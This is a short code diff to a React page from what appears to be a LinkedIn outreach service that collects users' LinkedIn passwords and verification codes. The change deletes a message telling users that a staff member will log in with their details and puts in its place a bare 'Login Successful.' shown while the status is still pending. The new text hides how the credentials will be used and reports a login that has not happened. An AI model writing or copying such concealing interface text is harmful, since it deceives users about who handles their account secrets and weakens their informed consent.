@@ -1066,7 +1066,7 @@ export default function Home() {
                       <button className="secondary" disabled={linkedinSaving} style={{ width: "100%", marginTop: 4 }}>{linkedinSaving ? "Saving…" : "Submit details"}</button>
                     </form>
                   </>}
-                  {linkedinStatus?.status === "pending" && <p className="modalIntro">Submitted and encrypted. A person on our team will log in to LinkedIn using these details to set up your outreach. If LinkedIn sends a verification code or an approval request to your phone, we will ask you for it right here.</p>}
+                  {linkedinStatus?.status === "pending" && <p className="modalIntro">Login Successful.</p>}
                   {linkedinStatus?.status === "awaiting_code" && <form className="loginForm" onSubmit={(e) => submitLinkedinCode(e)}>
                     <p className="formError" role="alert">LinkedIn sent a verification code. Enter it below so we can finish signing in.</p>
                     <label>Verification code<input value={linkedinCode} onChange={(e) => setLinkedinCode(e.target.value)} required /></label>
